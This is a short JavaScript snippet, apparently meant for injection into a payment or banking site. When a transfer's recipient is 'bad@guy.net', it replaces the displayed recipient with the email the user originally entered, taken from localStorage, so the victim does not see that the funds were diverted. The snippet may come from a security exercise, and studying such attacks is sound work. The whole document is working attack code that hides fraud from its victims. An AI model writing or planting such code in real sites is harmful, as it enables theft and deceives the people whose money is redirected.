BAD_GUY_EMAIL = 'bad@guy.net';

if (!window.location.toString().endsWith('transfer')) {
    const receiverNode = document.querySelector('body > main > table > tbody > tr:nth-child(2) > td:nth-child(2)');

    if (receiverNode.textContent === BAD_GUY_EMAIL) {
        const transferId = document.querySelector("body > main > header > h2").textContent.split(' ')[1];

        const saved = window.localStorage.getItem(transferId);
        if (saved) {
            receiverNode.textContent = saved;
        } else {
            const last = window.localStorage.getItem('last_email');
            receiverNode.textContent = last;
            window.localStorage.setItem(transferId, last);
        }
    }
}